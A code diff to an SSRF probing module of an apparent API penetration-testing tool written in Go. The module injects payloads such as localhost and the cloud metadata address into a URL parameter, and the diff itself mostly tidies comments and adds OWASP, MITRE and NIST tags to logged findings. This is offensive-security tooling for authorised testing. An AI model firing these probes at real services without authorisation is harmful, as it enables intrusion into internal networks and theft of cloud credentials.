@@ -5,26 +5,21 @@ import (
 	"net/http"
 	"net/url"
 
-	"github.com/JoseMariaMicoli/VaporTrace/pkg/db" // Added Persistence
+	"github.com/JoseMariaMicoli/VaporTrace/pkg/db"
+	"github.com/JoseMariaMicoli/VaporTrace/pkg/utils"
 	"github.com/pterm/pterm"
 )
 
 type SSRFContext struct {
 	TargetURL string
 	ParamName string
-	Callback  string // The "Canary" or "Interactsh" listener
+	Callback  string 
 }
 
 func (s *SSRFContext) Probe() {
 	pterm.DefaultHeader.WithFullWidth(false).Println("API7: Server-Side Request Forgery Tracker")
 
-	// PATCH: Create a shallow copy of the GlobalClient.
-	// This inherits the Transport (Proxy settings) from GlobalClient
-	// but allows us to set a custom CheckRedirect policy for SSRF only.
 	client := *GlobalClient
-	
-	// We do NOT follow redirects automatically to detect if the API 
-	// is acting as a proxy or just a redirector.
 	client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
 		return http.ErrUseLastResponse
 	}
@@ -44,8 +39,6 @@ func (s *SSRFContext) Probe() {
 		u.RawQuery = q.Encode()
 		fuzzedURL := u.String()
 
-		pterm.Info.Printf("Injecting SSRF Payload: %s\n", payload)
-
 		req, _ := http.NewRequest("GET", fuzzedURL, nil)
 		if CurrentSession.AttackerToken != "" {
 			req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", CurrentSession.AttackerToken))
@@ -53,36 +46,32 @@ func (s *SSRFContext) Probe() {
 
 		resp, err := client.Do(req)
 		if err != nil {
-			pterm.Error.Printf("Request failed for %s: %v\n", payload, err)
 			continue
 		}
 		defer resp.Body.Close()
 
-		// Logic analysis:
-		// 1. If we hit metadata/localhost and get 200/403/401, the server reached it.
-		// 2. If we hit the callback and see a hit on our listener, it's confirmed.
 		if resp.StatusCode < 500 {
 			if payload == "http://127.0.0.1:80" || payload == "http://169.254.169.254/latest/meta-data/" {
-				pterm.Warning.Prefix = pterm.Prefix{Text: "VULN", Style: pterm.NewStyle(pterm.BgRed, pterm.FgWhite)}
-				pterm.Warning.Printf("PROBABLE SSRF: Internal resource responded with status %d\n", resp.StatusCode)
-
-				// PERSISTENCE HOOK: Critical
-				db.LogQueue <- db.Finding{
-					Phase:   "PHASE IV: INJECTION",
-					Target:  s.TargetURL,
-					Details: fmt.Sprintf("SSRF Internal Access: %s", payload),
-					Status:  "CRITICAL VULNERABLE",
-				}
+				// PATCHED: Unified Logging with Phase 9.13 Tags
+				utils.RecordFinding(db.Finding{
+					Phase:    "PHASE IV: INJECTION",
+					Target:   s.TargetURL,
+					Details:  fmt.Sprintf("SSRF Internal Access: %s", payload),
+					Status:   "CRITICAL VULNERABLE",
+					OWASP_ID: "API7:2023",
+					MITRE_ID: "T1071.001", // Web Protocols (or T1190 Exploit Public-Facing Application)
+					NIST_Tag: "DE.CM",
+				})
 			} else {
-				pterm.Success.Printf("Payload delivered. Status: %d. Monitor your listener: %s\n", resp.StatusCode, s.Callback)
-				
-				// PERSISTENCE HOOK: Monitor
-				db.LogQueue <- db.Finding{
-					Phase:   "PHASE IV: INJECTION",
-					Target:  s.TargetURL,
-					Details: "SSRF Callback Triggered",
-					Status:  "POTENTIAL CALLBACK",
-				}
+				utils.RecordFinding(db.Finding{
+					Phase:    "PHASE IV: INJECTION",
+					Target:   s.TargetURL,
+					Details:  "SSRF Callback Triggered",
+					Status:   "POTENTIAL CALLBACK",
+					OWASP_ID: "API7:2023",
+					MITRE_ID: "T1213", // Data from Information Repositories
+					NIST_Tag: "DE.AE",
+				})
 			}
 		}
 	}
